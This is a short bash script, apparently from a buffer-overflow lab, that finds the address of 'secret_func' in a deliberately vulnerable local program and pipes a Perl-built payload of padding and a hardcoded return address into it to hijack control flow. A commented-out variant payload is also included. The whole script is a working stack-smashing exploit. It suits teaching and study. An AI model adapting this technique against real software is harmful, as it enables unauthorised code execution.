#!/bin/bash

# Find &secret_func
# $ nm ./bof_vuln |grep secret
# 000104c4 t secret_func
## 0000067c t secret_func

PUT=./bof_vuln_reg  #./bof_vuln_lessprot
addr=$(nm ${PUT} |grep -w secret_func|awk '{print $1}')
echo "addr of secret_func() is ${addr}"
#000104c4
perl -e 'print "A"x12 . "B"x4 . "\xc4\x04\x01\x00"' | ${PUT}
#perl -e 'print "A"x12 . "B"x4 . "\xe9\x11\x00\x00"' | ${PUT}
